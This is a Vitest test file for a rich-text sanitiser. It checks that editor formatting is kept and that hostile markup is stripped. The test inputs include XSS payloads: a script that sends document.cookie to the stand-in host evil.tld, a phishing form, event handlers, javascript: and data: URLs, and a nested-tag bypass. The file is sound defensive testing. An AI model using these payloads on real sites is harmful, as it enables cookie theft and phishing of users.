import { describe, expect, it } from "vitest";
import sanitiseRichText from "@/Utils/sanitiseRichText";

describe("sanitiseRichText", () => {
  describe("keeps what the editor produces", () => {
    // Each case is markup the TipTap toolbar can actually create. If the
    // allowlist tightens by accident, an admin silently loses formatting they
    // already saved — so these matter as much as the attack cases below.
    it.each([
      ["a paragraph", "<p>Meet at the north entrance.</p>"],
      ["bold", "<p><strong>Bring the trolley key</strong></p>"],
      ["italic", "<p><em>usually</em></p>"],
      ["strikethrough", "<p><s>Old location</s></p>"],
      ["a bullet list", "<ul><li>Keys</li><li>Sign</li></ul>"],
      ["an ordered list", "<ol><li>Collect</li><li>Set up</li></ol>"],
      ["a heading", "<h3>Parking</h3>"],
      ["a line break", "<p>Level 1<br>Rear door</p>"],
      ["a blockquote", "<blockquote><p>Note from the coordinator</p></blockquote>"],
      ["a horizontal rule", "<hr>"],
      ["code", "<p><code>Gate 4</code></p>"],
    ])("%s", (_label, html) => {
      expect(sanitiseRichText(html)).toBe(html);
    });

    it("keeps the alignment TextAlign writes as an inline style", () => {
      const result = sanitiseRichText("<p style=\"text-align: center\">Centre</p>");

      expect(result).toContain("text-align");
      expect(result).toContain("Centre");
    });

    it.each([
      ["https", "<a href=\"https://example.org\">Map</a>"],
      ["http", "<a href=\"http://example.org\">Map</a>"],
      ["mailto", "<a href=\"mailto:coordinator@example.org\">Email</a>"],
      ["tel", "<a href=\"tel:+61312345678\">Call</a>"],
      ["sms", "<a href=\"sms:+61312345678\">Text</a>"],
    ])("keeps a %s link, which the editor allows", (_scheme, html) => {
      const result = sanitiseRichText(html);

      expect(result).toContain("<a ");
      expect(result).toContain("href=");
    });
  });

  describe("removes what it cannot be", () => {
    it("drops a script tag and its contents", () => {
      const result = sanitiseRichText("<p>Hi</p><script>fetch(\"//evil.tld?c=\"+document.cookie)</script>");

      expect(result).toBe("<p>Hi</p>");
      expect(result).not.toContain("script");
      expect(result).not.toContain("fetch");
    });

    it.each([
      "onclick",
      "onerror",
      "onload",
      "onmouseover",
      "onfocus",
    ])("strips the %s handler", (attribute) => {
      const result = sanitiseRichText(`<p ${attribute}="alert(1)">Text</p>`);

      expect(result).not.toContain(attribute);
      expect(result).toContain("Text");
    });

    it("strips an event handler from an image that never loads", () => {
      // The classic no-script-tag payload: the tag is not on the allowlist, so
      // both the element and its handler go.
      const result = sanitiseRichText("<img src=x onerror=\"alert(1)\">");

      expect(result).not.toContain("onerror");
      expect(result).not.toContain("<img");
    });

    it.each([
      ["javascript", "<a href=\"javascript:alert(1)\">Click</a>"],
      ["data", "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Click</a>"],
      ["vbscript", "<a href=\"vbscript:msgbox(1)\">Click</a>"],
    ])("drops a %s: URL while keeping the link text", (_scheme, html) => {
      const result = sanitiseRichText(html);

      expect(result.toLowerCase()).not.toContain("javascript:");
      expect(result.toLowerCase()).not.toContain("data:");
      expect(result.toLowerCase()).not.toContain("vbscript:");
      expect(result).toContain("Click");
    });

    it("drops an iframe", () => {
      expect(sanitiseRichText("<iframe src=\"//evil.tld\"></iframe>")).not.toContain("iframe");
    });

    it("drops a form, which could phish inside the dashboard", () => {
      const result = sanitiseRichText("<form action=\"//evil.tld\"><input name=\"password\"></form>");

      expect(result).not.toContain("<form");
      expect(result).not.toContain("<input");
    });

    it("drops svg-wrapped script", () => {
      expect(sanitiseRichText("<svg><script>alert(1)</script></svg>")).not.toContain("alert");
    });

    it("drops a style element that could hide or reposition the page", () => {
      expect(sanitiseRichText("<style>body{display:none}</style>")).not.toContain("display:none");
    });

    it("survives a nested payload that only becomes a tag once unwrapped", () => {
      // Naive single-pass strippers turn this into `<script>` by removing the
      // inner pair. DOMPurify parses rather than pattern-matches.
      const result = sanitiseRichText("<scr<script>ipt>alert(1)</scr</script>ipt>");

      expect(result).not.toContain("<script");
    });
  });

  describe("edge cases", () => {
    it.each([
      ["null", null],
      ["undefined", undefined],
      ["an empty string", ""],
    ])("returns an empty string for %s, so callers need no fallback", (_label, value) => {
      expect(sanitiseRichText(value)).toBe("");
    });

    it("leaves plain text untouched", () => {
      expect(sanitiseRichText("Just a note")).toBe("Just a note");
    });

    it("escapes a stray angle bracket rather than dropping the text", () => {
      expect(sanitiseRichText("<p>5 < 10</p>")).toContain("10");
    });
  });
});
